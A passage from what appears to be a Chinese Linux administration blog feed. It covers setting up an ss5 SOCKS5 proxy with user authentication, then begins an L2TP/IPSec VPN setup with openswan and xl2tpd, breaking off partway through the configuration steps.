<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c756770f804786072-6">6</div></p>
<p><div class="crayon-num" data-line="crayon-560d1c756770f804786072-7">7</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c756770f804786072-8">8</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-560d1c756770f804786072-1" class="crayon-line"><span class="crayon-p"># vim /etc/opt/ss5/ss5.conf</span></div></p>
<p><div id="crayon-560d1c756770f804786072-2" class="crayon-line crayon-striped-line"><span class="crayon-i">auth</span> <span class="crayon-cn">0.0.0.0</span><span class="crayon-o">/</span><span class="crayon-cn">0</span> – <span class="crayon-o">-</span></div></p>
<p><div id="crayon-560d1c756770f804786072-3" class="crayon-line">改为</div></p>
<p><div id="crayon-560d1c756770f804786072-4" class="crayon-line crayon-striped-line"><span class="crayon-i">auth</span> <span class="crayon-cn">0.0.0.0</span><span class="crayon-o">/</span><span class="crayon-cn">0</span> – <span class="crayon-i">u</span></div></p>
<p><div id="crayon-560d1c756770f804786072-5" class="crayon-line"></div></p>
<p><div id="crayon-560d1c756770f804786072-6" class="crayon-line crayon-striped-line"><span class="crayon-i">permit</span> – <span class="crayon-cn">0.0.0.0</span><span class="crayon-o">/</span><span class="crayon-cn">0</span> – <span class="crayon-cn">0.0.0.0</span><span class="crayon-o">/</span><span class="crayon-cn">0</span> – – – – <span class="crayon-o">-</span></div></p>
<p><div id="crayon-560d1c756770f804786072-7" class="crayon-line">改成为</div></p>
<p><div id="crayon-560d1c756770f804786072-8" class="crayon-line crayon-striped-line"><span class="crayon-i">permit</span> <span class="crayon-i">u</span> <span class="crayon-cn">0.0.0.0</span><span class="crayon-o">/</span><span class="crayon-cn">0</span> – <span class="crayon-cn">0.0.0.0</span><span class="crayon-o">/</span><span class="crayon-cn">0</span> – – – – <span class="crayon-o">-</span></div><br><br><br><br><br><br><br><strong>3. 添加socket 5用户</strong></p>
<p><div id="crayon-560d1c7567713791533395" class="crayon-syntax crayon-theme-visual-assist crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="hide"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-560d1c7567713791533395-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c7567713791533395-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-560d1c7567713791533395-3">3</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-560d1c7567713791533395-1" class="crayon-line"><span class="crayon-p"># cat /etc/opt/ss5/ss5.passwd</span></div></p>
<p><div id="crayon-560d1c7567713791533395-2" class="crayon-line crayon-striped-line"> <span class="crayon-p">##用户  密码</span></div></p>
<p><div id="crayon-560d1c7567713791533395-3" class="crayon-line"><span class="crayon-i">ttlsa</span> <span class="crayon-cn">123456</span></div><br><br><br><br><br><br><br><strong>4. 启动socket 5</strong></p>
<p><div id="crayon-560d1c7567717787798230" class="crayon-syntax crayon-theme-visual-assist crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="hide"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-560d1c7567717787798230-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c7567717787798230-2">2</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-560d1c7567717787798230-1" class="crayon-line"><span class="crayon-p"># sh /etc/rc.d/init.d/ss5 start</span></div></p>
<p><div id="crayon-560d1c7567717787798230-2" class="crayon-line crayon-striped-line"><span class="crayon-e">doneting </span><span class="crayon-v">ss5</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><br><br><br><br><br><br><br>默认情况ss5文件没有执行权限，如果觉得使用sh来启动麻烦，那么按如下方法：</p>
<p><div id="crayon-560d1c756771a713658796" class="crayon-syntax crayon-theme-visual-assist crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="hide"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-560d1c756771a713658796-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c756771a713658796-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-560d1c756771a713658796-3">3</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c756771a713658796-4">4</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-560d1c756771a713658796-1" class="crayon-line"><span class="crayon-p"># chmod u+x /etc/rc.d/init.d/ss5</span></div></p>
<p><div id="crayon-560d1c756771a713658796-2" class="crayon-line crayon-striped-line"><span class="crayon-p"># chkconfig –add ss5 //可选</span></div></p>
<p><div id="crayon-560d1c756771a713658796-3" class="crayon-line"><span class="crayon-p"># chkconfig ss5 on //可选</span></div></p>
<p><div id="crayon-560d1c756771a713658796-4" class="crayon-line crayon-striped-line"><span class="crayon-p"># service ss5 start</span></div><br><br><br><br><br><br><br><strong>5. 查看是否启动</strong></p>
<p><div id="crayon-560d1c756771e398435270" class="crayon-syntax crayon-theme-visual-assist crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="hide"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-560d1c756771e398435270-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c756771e398435270-2">2</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-560d1c756771e398435270-1" class="crayon-line"><span class="crayon-p"># netstat -lntp  | grep ss5</span></div></p>
<p><div id="crayon-560d1c756771e398435270-2" class="crayon-line crayon-striped-line"><span class="crayon-i">tcp</span>        <span class="crayon-cn">0</span>      <span class="crayon-cn">0</span> <span class="crayon-cn">0.0.0.0</span><span class="crayon-o">:</span><span class="crayon-cn">1080</span>   <span class="crayon-cn">0.0.0.0</span><span class="crayon-o">:</span><span class="crayon-o">*</span>      <span class="crayon-i">LISTEN</span>      <span class="crayon-cn">14262</span><span class="crayon-o">/</span><span class="crayon-v">ss5</span></div><br><br><br><br><br><br><br>默认端口1080</p>
<p><strong>6.</strong> 测试socks5<br>安装Proxifier，默认情况所有请求都走socks5.打开百度，输入IP，可以看到如下结果是我们运维生存时间（ttlsa.com）的ip地址</p>
<p><a href="http://www.ttlsa.com/wp-content/uploads/2014/04/socks5-test.jpg" target="_blank" rel="external"><img src="http://www.ttlsa.com/wp-content/uploads/2014/04/539x222xsocks5-test.jpg.pagespeed.ic.734JuaXs5L.webp" alt="Linux" title="linux下搭建socks 5代理"></a></p>
<p><strong>7. 常见错误</strong><br>7.1 缺少PAM</p>
<p><div id="crayon-560d1c7567723271870501" class="crayon-syntax crayon-theme-visual-assist crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="hide"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-560d1c7567723271870501-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-560d1c7567723271870501-2">2</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-560d1c7567723271870501-1" class="crayon-line"><span class="crayon-v">configure</span><span class="crayon-o">:</span> <span class="crayon-v">error</span><span class="crayon-o">:</span> <span class="crayon-o"><em></em></span><span class="crayon-o"></span><span class="crayon-o"><em></em></span> <span class="crayon-e">Some </span><span class="crayon-e">of </span><span class="crayon-e">the </span><span class="crayon-e">headers </span><span class="crayon-i">weren</span>‘<span class="crayon-i">t</span> <span class="crayon-e ">found </span><span class="crayon-o"><em></em></span><span class="crayon-o"></span></div></p>
<p><div id="crayon-560d1c7567723271870501-2" class="crayon-line crayon-striped-line"><span class="crayon-p"># yum -y install pam-devel</span></div><br><br><br><br><br><br><br>配置</p>
<p>一般来说安装完后，会在/etc目录下生成socks5.conf(配置文件)和socks5.passwd(用于验证的文件)这两个文件，<br>下面我把我的配置文件帖出来</p>
<p>#/etc/socks5.conf</p>
<p>#指定SOCKS v5绑定的ip地址和监听的端口。如果不指定绑定的IP将使用0.0.0.0<br>set SOCKS5_BINDINFC 192.168.0.8:1080</p>
<p>#忽略ident请求。当客户机没有运行identd时，使用SOCKS5_NOIDENT将降低超时值<br>set SOCKS5_NOIDENT</p>
<p>#指定连接停顿最长时间。超过最大值后，socks5断开连接<br>set SOCKS5_TIMEOUT 15</p>
<p>#socks5将接受SOCKS V4 协议的请求,默认不接受<br>set SOCKS5_V4SUPPORT</p>
<p>#指定同时存在的最大子进程数,Socks5预设为64<br>set SOCKS5_MAXCHILD 4</p>
<p>#指定密码文件<br>set SOCKS5_PWDFILE /usr/local/socks5/etc/socks5.passwd</p>
<p>#对所有的客户连接都使用username/password用户认证方法<br>auth - - u</p>
<p>#允许来自192.168.0.的任何经过用户认证的连接<br>permit u - 192.168.0. - - -</p>
<p><pre>#/usr/local/socks5/etc/socks5.passwd</pre></p>
<p>#用户  密码<br>userA passwdA<br>userB passwdB<br>userC passwdC<br>前面的一些设置由于我在配置文件里都写了相关的内容，就不在说明了<br>如果不需要用户验证只需要把<br> auth - - u<br>改成 auth - - -<br>permit u - 192.168.0. - - -<br>改成<br>permit - - - - - -<br><br>大家注意上面permit - - - - - -这一句，是使任何人都可以使用你的socks5 server，非常不安全（让你作跳板），最好是有点限制<br>如</p>
<p><pre>permit - - clientIP - - -</pre><br>开始测试</p>
<p><table border="1" width="100%" cellspacing="0" cellpadding="5" bgcolor="#cccccc"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<td>

<pre><code>/usr/local/socks5/bin/socks5 -f -s`&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
如果出现下面的信息表示测试成功。
&lt;table border=&quot;1&quot; width=&quot;100%&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; bgcolor=&quot;#cccccc&quot;&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;`18210: Socks5 starting at Mon Dec 14 18:23:45 1998 in normal mode`&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
然后退出socks5,开始正式运行它在背景模式：

正式运行
&lt;table border=&quot;1&quot; width=&quot;100%&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; bgcolor=&quot;#cccccc&quot;&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;`/usr/local/socks5/bin/socks5 -t -s 2&amp;gt; /var/log/socks5`&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
最后，加到/etc/rc.d/rc.local
&lt;table border=&quot;1&quot; width=&quot;601&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; bgcolor=&quot;#cccccc&quot;&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;pre&gt;`
echo &quot;/usr/local/socks5/bin/socks5 -t -s 2&amp;gt; /var/log/socks5.log&quot;
&amp;gt;&amp;gt; /etc/rc.d/rc.local
</code></pre><p></p></td><br><br><br><br>如果要停止socks5，只要运行<span style="font-family: NSimsun;">/usr/local/socks5/bin/</span>stopsocks -kill就行，socks5就会停止！<br>启动测试：<span style="font-family: NSimsun;">/usr/local/socks5/bin/socks5 -t</span><br>使用非默认端口：如果你想让socks5服务启动的时候不启动默认监听端口1080，比如为1234，我们可以运行如下命令<br>socks5 -b 1234 -t 当然你关掉这个服务，就必须用下面的命令 <span style="font-family: NSimsun;">/usr/local/socks5/bin/</span>stopsocks -p 1234 -kill<p></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[L2TP+IPSec 配置方法 包括一键脚本]]></title>
      <url>http://www.linux52.com/2015-10-01-l2tpipsec-e9-85-8d-e7-bd-ae-e6-96-b9-e6-b3-95-e5-8c-85-e6-8b-ac-e4-b8-80-e9-94-ae-e8-84-9a-e6-9c-ac.html</url>
      <content type="html"><![CDATA[<h1 id="检测是否支持"><a href="#检测是否支持" class="headerlink" title="检测是否支持"></a>检测是否支持</h1><p>执行如下命令</p>
<ol>
<li><p><span class="pln">cat </span><span class="pun">/</span><span class="pln">dev</span><span class="pun">/</span><span class="pln">net</span><span class="pun">/</span><span class="pln">tun</span><br>返回信息应该为</p>
</li>
<li><p><span class="pln">cat</span><span class="pun">:</span> <span class="str">/dev/</span><span class="pln">net</span><span class="pun">/</span><span class="pln">tun</span><span class="pun">:</span> <span class="typ">File</span><span class="pln"> descriptor </span><span class="kwd">in</span><span class="pln"> bad state</span><br>再执行如下命令</p>
</li>
<li><p><span class="pln">cat </span><span class="pun">/</span><span class="pln">dev</span><span class="pun">/</span><span class="pln">ppp</span><br>返回信息应该为</p>
</li>
<li><p><span class="pln">cat</span><span class="pun">:</span> <span class="str">/dev/</span><span class="pln">ppp</span><span class="pun">:</span> <span class="typ">No</span><span class="pln"> such device </span><span class="kwd">or</span><span class="pln"> address</span><br>如果返回信息不同 那么请联系你的主机商开通TUN和PPP</p>
</li>
</ol>
<h1 id="CentOS手动编译"><a href="#CentOS手动编译" class="headerlink" title="CentOS手动编译"></a>CentOS手动编译</h1><h2 id="安装openswan"><a href="#安装openswan" class="headerlink" title="安装openswan"></a>安装openswan</h2><p>首先来安装openswan 如果之前装过 建议先删除 删除方法如下</p>
<ol>
<li><p><span class="pln">yum remove openswan</span><br>然后去openswan网站下载最新的源代码 在那之前先安装一些需要的依赖包</p>
</li>
<li><p><span class="pln">yum install make gcc gmp</span><span class="pun">-</span><span class="pln">devel bison flex</span><br>下载完openswan以后 解压缩openswan 进入openswan的目录 编译 安装</p>
</li>
<li><p><span class="pln">tar zxvf openswan</span><span class="pun">-</span><span class="pln">xxx</span><span class="pun">.</span><span class="pln">bz</span></p>
</li>
<li><span class="pln">cd openswan</span></li>
<li><span class="pln">make programs install</span></li>
</ol>
<h2 id="编辑ipsec-conf"><a href="#编辑ipsec-conf" class="headerlink" title="编辑ipsec.conf"></a>编辑ipsec.conf</h2><p>然后编辑 etc/ipsec.conf 这文件对格式要求很严格 缩进问题都会导致出错 所以这个下面的这个代码仅供参考 如果直接复制出现问题 请编辑原来的配置文件 修改成这样子</p>
<ol>
<li><span class="pln">version </span><span class="lit">2.0</span> <span class="com"># confirms to second version of ipsec.conf specification</span><br>2.3.  <span class="pln">config setup</span></li>
<li><span class="pln"> nat_traversal</span><span class="pun">=</span><span class="pln">yes</span></li>
<li><span class="pln"> virtual_private</span><span class="pun">=%</span><span class="pln">v4</span><span class="pun">:</span><span class="lit">10.0</span><span class="pun">.</span><span class="lit">0.0</span><span class="pun">/</span><span class="lit">8</span><span class="pun">,%</span><span class="pln">v4</span><span class="pun">:</span><span class="lit">192.168</span><span class="pun">.</span><span class="lit">0.0</span><span class="pun">/</span><span class="lit">16</span><span class="pun">,%</span><span class="pln">v4</span><span class="pun">:</span><span class="lit">172.16</span><span class="pun">.</span><span class="lit">0.0</span><span class="pun">/</span><span class="lit">12</span><span class="pun">,%</span><span class="pln">v4</span><span class="pun">:</span><span class="lit">25.0</span><span class="pun">.</span><span class="lit">0.0</span><span class="pun">/</span><span class="lit">8</span><span class="pun">,%</span><span class="pln">v6</span><span class="pun">:</span><span class="pln">fd00</span><span class="pun">::</span><span class="str">/8,%v6:fe80::/</span><span class="lit">10</span></li>
<li><span class="pln"> oe</span><span class="pun">=</span><span class="pln">off</span></li>
<li><span class="pln"> protostack</span><span class="pun">=</span><span class="pln">netkey</span><br>8.9.  <span class="pln">conn L2TP</span><span class="pun">-</span><span class="pln">PSK</span><span class="pun">-</span><span class="pln">NAT</span></li>
<li><span class="pln"> rightsubnet</span><span class="pun">=</span><span class="pln">vhost</span><span class="pun">:%</span><span class="pln">priv</span></li>
<li><span class="pln"> also</span><span class="pun">=</span><span class="pln">L2TP</span><span class="pun">-</span><span class="pln">PSK</span><span class="pun">-</span><span class="pln">noNAT</span><br>12.13.  <span class="pln">conn L2TP</span><span class="pun">-</span><span class="pln">PSK</span><span class="pun">-</span><span class="pln">noNAT</span></li>
<li><span class="pln"> authby</span><span class="pun">=</span><span class="pln">secret</span></li>
<li><span class="pln"> pfs</span><span class="pun">=</span><span class="kwd">no</span></li>
<li><span class="kwd">auto</span><span class="pun">=</span><span class="pln">add</span></li>
<li><span class="pln"> keyingtries</span><span class="pun">=</span><span class="lit">3</span></li>
<li><span class="pln"> rekey</span><span class="pun">=</span><span class="kwd">no</span></li>
<li><span class="com"># Apple iOS doesn’t send delete notify so we need dead peer detection</span></li>
<li><span class="com"># to detect vanishing clients</span></li>
<li><span class="pln"> dpddelay</span><span class="pun">=</span><span class="lit">10</span></li>
<li><span class="pln"> dpdtimeout</span><span class="pun">=</span><span class="lit">10</span></li>
<li><span class="pln"> dpdaction</span><span class="pun">=</span><span class="pln">clear</span></li>
<li><span class="pln"> ikelifetime</span><span class="pun">=</span><span class="lit">8h</span></li>
<li><span class="pln"> keylife</span><span class="pun">=</span><span class="lit">1h</span></li>
<li><span class="pln"> type</span><span class="pun">=</span><span class="pln">transport</span></li>
<li><span class="pln"> left</span><span class="pun">=修改成你的服务器的</span><span class="pln">IP</span></li>
<li><span class="pln"> leftid</span><span class="pun">=修改成你的服务器的</span><span class="pln">IP</span></li>
<li><span class="pln"> leftprotoport</span><span class="pun">=</span><span class="lit">17</span><span class="pun">/</span><span class="lit">1701</span></li>
<li><span class="pln"> right</span><span class="pun">=%</span><span class="pln">any</span></li>
<li><span class="pln"> rightid</span><span class="pun">=%</span><span class="pln">any</span></li>
<li><span class="pln"> rightprotoport</span><span class="pun">=</span><span class="lit">17</span><span class="pun">/%</span><span class="pln">any</span></li>
</ol>
<h2 id="设置预共享密钥-PSK"><a href="#设置预共享密钥-PSK" class="headerlink" title="设置预共享密钥(PSK)"></a>设置预共享密钥(PSK)</h2><ol>
<li><p><span class="pln">vim </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">ipsec</span><span class="pun">.</span><span class="pln">secrets</span><br>上面的文件应该要自己建立，内容编辑成这样<br>SERVER-IP:服务器的IP地址<br>SharedKey:你自己设置的PSK</p>
</li>
<li><p><span class="pln">SERVER</span><span class="pun">-</span><span class="pln">IP </span><span class="pun">%</span><span class="pln">any</span><span class="pun">:</span><span class="pln"> PSK </span><span class="str">“SharedKey”</span><br>设置完毕以后ipsec就搞定了</p>
</li>
</ol>
<h2 id="安装依赖-PPP"><a href="#安装依赖-PPP" class="headerlink" title="安装依赖(PPP)"></a>安装依赖(PPP)</h2><ol>
<li><p><span class="pln">yum install libpcap</span><span class="pun">-</span><span class="pln">devel ppp</span></p>
</li>
<li><p><span class="pln">wget http</span><span class="pun">:</span><span class="com">//downloads.sourceforge.net/project/rp-l2tp/rp-l2tp/0.4/rp-l2tp-0.4.tar.gz</span></p>
</li>
<li><span class="pln">tar zxvf rp</span><span class="pun">-</span><span class="pln">l2tp</span><span class="pun">-</span><span class="lit">0.4</span><span class="pun">.</span><span class="pln">tar</span><span class="pun">.</span><span class="pln">gz</span></li>
<li><span class="pln">cd rp</span><span class="pun">-</span><span class="pln">l2tp</span><span class="pun">-</span><span class="lit">0.4</span></li>
<li><span class="pun">./</span><span class="pln">configure</span></li>
<li><span class="pln">make</span></li>
<li><span class="pln"> </span></li>
<li><span class="pln">cp handlers</span><span class="pun">/</span><span class="pln">l2tp</span><span class="pun">-</span><span class="pln">control </span><span class="pun">/</span><span class="pln">usr</span><span class="pun">/</span><span class="kwd">local</span><span class="pun">/</span><span class="pln">sbin</span><span class="pun">/</span></li>
<li><span class="pln">mkdir </span><span class="pun">/</span><span class="kwd">var</span><span class="pun">/</span><span class="pln">run</span><span class="pun">/</span><span class="pln">xl2tpd</span><span class="pun">/</span></li>
<li><span class="pln">ln </span><span class="pun">-</span><span class="pln">s </span><span class="pun">/</span><span class="pln">usr</span><span class="pun">/</span><span class="kwd">local</span><span class="pun">/</span><span class="pln">sbin</span><span class="pun">/</span><span class="pln">l2tp</span><span class="pun">-</span><span class="pln">control </span><span class="pun">/</span><span class="kwd">var</span><span class="pun">/</span><span class="pln">run</span><span class="pun">/</span><span class="pln">xl2tpd</span><span class="pun">/</span><span class="pln">l2tp</span><span class="pun">-</span><span class="pln">control</span></li>
<li><span class="pln"> </span></li>
<li><span class="pln">cd xl2tpd</span></li>
<li><span class="pln">make install</span></li>
<li><span class="pln"> </span></li>
<li><span class="pln">mkdir </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">xl2tpd</span></li>
<li><span class="pln">vim </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">xl2tpd</span><span class="pun">/</span><span class="pln">xl2tpd</span><span class="pun">.</span><span class="pln">conf</span><br>编辑成下面这个样子 设置以下你想分配给客户端的地址 以及虚拟服务器的IP</li>
</ol>
<p>1.2.  <span class="pun">[</span><span class="pln">lns </span><span class="kwd">default</span><span class="pun">]</span></p>
<ol>
<li><span class="pln">ip range </span><span class="pun">=</span> <span class="lit">192.168</span><span class="pun">.</span><span class="lit">1.128</span><span class="pun">-</span><span class="lit">192.168</span><span class="pun">.</span><span class="lit">1.254</span></li>
<li><span class="kwd">local</span><span class="pln"> ip </span><span class="pun">=</span> <span class="lit">192.168</span><span class="pun">.</span><span class="lit">1.99</span></li>
<li><span class="kwd">require</span><span class="pln"> chap </span><span class="pun">=</span><span class="pln"> yes</span></li>
<li><span class="pln">refuse pap </span><span class="pun">=</span><span class="pln"> yes</span></li>
<li><span class="kwd">require</span><span class="pln"> authentication </span><span class="pun">=</span><span class="pln"> yes</span></li>
<li><span class="pln">name </span><span class="pun">=</span> <span class="typ">LinuxVPNserver</span></li>
<li><span class="pln">ppp debug </span><span class="pun">=</span><span class="pln"> yes</span></li>
<li><span class="pln">pppoptfile </span><span class="pun">=</span> <span class="str">/etc/</span><span class="pln">ppp</span><span class="pun">/</span><span class="pln">options</span><span class="pun">.</span><span class="pln">xl2tpd</span></li>
<li><span class="pln">length bit </span><span class="pun">=</span><span class="pln"> yes</span></li>
</ol>
<h2 id="修改xl2tp配置"><a href="#修改xl2tp配置" class="headerlink" title="修改xl2tp配置"></a>修改xl2tp配置</h2><ol>
<li><p><span class="pln">vim </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">ppp</span><span class="pun">/</span><span class="pln">options</span><span class="pun">.</span><span class="pln">xl2tpd</span><br>编辑成这样</p>
</li>
<li><p><span class="kwd">require</span><span class="pun">-</span><span class="pln">mschap</span><span class="pun">-</span><span class="pln">v2</span></p>
</li>
<li><span class="pln">ms</span><span class="pun">-</span><span class="pln">dns </span><span class="lit">8.8</span><span class="pun">.</span><span class="lit">8.8</span></li>
<li><span class="pln">ms</span><span class="pun">-</span><span class="pln">dns </span><span class="lit">8.8</span><span class="pun">.</span><span class="lit">4.4</span></li>
<li><span class="pln">asyncmap </span><span class="lit">0</span></li>
<li><span class="pln">auth</span></li>
<li><span class="pln">crtscts</span></li>
<li><span class="kwd">lock</span></li>
<li><span class="pln">hide</span><span class="pun">-</span><span class="pln">password</span></li>
<li><span class="pln">modem</span></li>
<li><span class="pln">debug</span></li>
<li><span class="pln">name l2tpd</span></li>
<li><span class="pln">proxyarp</span></li>
<li><span class="pln">lcp</span><span class="pun">-</span><span class="pln">echo</span><span class="pun">-</span><span class="pln">interval </span><span class="lit">30</span></li>
<li><span class="pln">lcp</span><span class="pun">-</span><span class="pln">echo</span><span class="pun">-</span><span class="pln">failure </span><span class="lit">4</span></li>
<li><span class="pln">mtu </span><span class="lit">1400</span></li>
<li><span class="pln">noccp</span></li>
<li><span class="pln">connect</span><span class="pun">-</span><span class="pln">delay </span><span class="lit">5000</span><br>上面的noccp用来解决IOS连接问题</li>
</ol>
<h2 id="添加账号密码"><a href="#添加账号密码" class="headerlink" title="添加账号密码"></a>添加账号密码</h2><ol>
<li><p><span class="pln">vim </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">ppp</span><span class="pun">/</span><span class="pln">chap</span><span class="pun">-</span><span class="pln">secrets</span><br>格式如下</p>
</li>
<li><p><span class="pun">账号</span><span class="pln"> l2tp </span><span class="pun">密码</span> <span class="pun"><em></em></span><br>账号密码用英文和数字 可以改为指定使用上面IP段中的IP地址</p>
</li>
</ol>
<h2 id="修改iptable规则"><a href="#修改iptable规则" class="headerlink" title="修改iptable规则"></a>修改iptable规则</h2><ol>
<li><p><span class="pln">iptables </span><span class="pun">-</span><span class="pln">I INPUT </span><span class="pun">-</span><span class="pln">p udp </span><span class="pun">-</span><span class="pln">m multiport </span><span class="pun">–</span><span class="pln">dport </span><span class="lit">1701</span><span class="pun">,</span><span class="lit">4500</span><span class="pun">,</span><span class="lit">500</span> <span class="pun">-</span><span class="pln">j ACCEPT</span><br>然后给客户端设置NAT伪装 (偷懒下 直接在接口上做伪装)</p>
</li>
<li><p><span class="pln">iptables </span><span class="pun">-</span><span class="pln">t nat </span><span class="pun">-</span><span class="pln">A POSTROUTING </span><span class="pun">-</span><span class="pln">o eth0 </span><span class="pun">-</span><span class="pln">j MASQUERADE</span></p>
</li>
</ol>
<h2 id="开启IP转发"><a href="#开启IP转发" class="headerlink" title="开启IP转发"></a>开启IP转发</h2><ol>
<li><p><span class="pln">vim </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">sysctl</span><span class="pun">.</span><span class="pln">conf</span><br>修改以下条目</p>
</li>
<li><p><span class="pln">net</span><span class="pun">.</span><span class="pln">ipv4</span><span class="pun">.</span><span class="pln">ip_forward </span><span class="pun">=</span> <span class="lit">1</span></p>
</li>
<li><span class="pln">net</span><span class="pun">.</span><span class="pln">ipv4</span><span class="pun">.</span><span class="pln">conf</span><span class="pun">.</span><span class="kwd">default</span><span class="pun">.</span><span class="pln">rp_filter </span><span class="pun">=</span> <span class="lit">0</span></li>
<li><p><span class="pln">net</span><span class="pun">.</span><span class="pln">ipv4</span><span class="pun">.</span><span class="pln">tcp_syncookies </span><span class="pun">=</span> <span class="lit">0</span><br>添加以下条目</p>
</li>
<li><p><span class="com"># Settings for OpenSwan IPSec implementation</span></p>
</li>
<li><span class="pln">net</span><span class="pun">.</span><span class="pln">ipv4</span><span class="pun">.</span><span class="pln">conf</span><span class="pun">.</span><span class="pln">all</span><span class="pun">.</span><span class="pln">send_redirects </span><span class="pun">=</span> <span class="lit">0</span></li>
<li><span class="pln">net</span><span class="pun">.</span><span class="pln">ipv4</span><span class="pun">.</span><span class="pln">conf</span><span class="pun">.</span><span class="kwd">default</span><span class="pun">.</span><span class="pln">send_redirects </span><span class="pun">=</span> <span class="lit">0</span></li>
<li><span class="pln">net</span><span class="pun">.</span><span class="pln">ipv4</span><span class="pun">.</span><span class="pln">conf</span><span class="pun">.</span><span class="pln">all</span><span class="pun">.</span><span class="pln">accept_redirects </span><span class="pun">=</span> <span class="lit">0</span></li>
<li><span class="pln">net</span><span class="pun">.</span><span class="pln">ipv4</span><span class="pun">.</span><span class="pln">conf</span><span class="pun">.</span><span class="kwd">default</span><span class="pun">.</span><span class="pln">accept_redirects </span><span class="pun">=</span> <span class="lit">0</span></li>
<li><p><span class="pln">net</span><span class="pun">.</span><span class="pln">core</span><span class="pun">.</span><span class="pln">xfrm_larval_drop </span><span class="pun">=</span> <span class="lit">1</span><br>运行一下命令让配置生效</p>
</li>
<li><p><span class="pln">sysctl </span><span class="pun">-</span><span class="pln">p</span></p>
</li>
</ol>
<h2 id="编辑xl2tp"><a href="#编辑xl2tp" class="headerlink" title="编辑xl2tp"></a>编辑xl2tp</h2><ol>
<li><p><span class="pln">vim </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">init</span><span class="pun">.</span><span class="pln">d</span><span class="pun">/</span><span class="pln">xl2tpd</span><br>编辑成这样</p>
</li>
